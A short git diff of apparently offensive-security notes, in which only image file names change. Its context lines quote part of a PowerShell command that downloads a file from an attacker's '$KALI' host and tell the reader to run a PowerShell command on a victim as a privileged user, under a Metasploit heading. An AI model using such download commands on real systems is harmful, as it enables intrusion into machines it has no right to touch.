@@ -155,7 +155,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/HHUP
 
 <figure><img src="../../.gitbook/assets/image (21) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Metasploit
 
@@ -176,7 +176,7 @@ run -j
 
 Copy powershell command to a the victim in a powershell prompt. Make sure its from a privileged user.
 
-<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
 
